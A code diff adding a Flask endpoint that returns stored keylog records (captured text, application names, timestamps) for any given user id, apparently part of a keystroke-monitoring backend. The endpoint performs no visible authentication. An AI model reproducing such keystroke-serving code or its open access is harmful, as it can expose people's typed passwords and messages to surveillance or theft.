@@ -82,6 +82,36 @@ def createORupdate():
     }
     return jsonify(success)
 
+# Endpoint to fetch keylog data
+@app.route('/getKeylogData/<user_id>', methods = ['GET'])
+def getKeyLogs(user_id):
+    data = {"u_id":user_id}
+    resultSet = connObj.NewSelect('keylog', data)
+    if resultSet == 'error':
+        error = {
+            "message": "Error."
+        }
+        return jsonify(error)
+
+    resultSetArray = []
+    for record in resultSet:
+        recordJson = {
+            "u_id": record[0],
+            "keylog_timestamp": record[1],
+            "application_name": record[2],
+            "log_text": record[3],
+            "notification_id": record[4],
+            "keylog_id": record[5],
+            "unique_identifier": record[6]
+        }
+        resultSetArray.append(recordJson)
+    success = {
+        "message":resultSetArray
+    }
+    # print resultSet
+    return jsonify(success)
+
+
 # Testing code block
 # Testing SELECT function
 @app.route('/test_select', methods=['POST'])
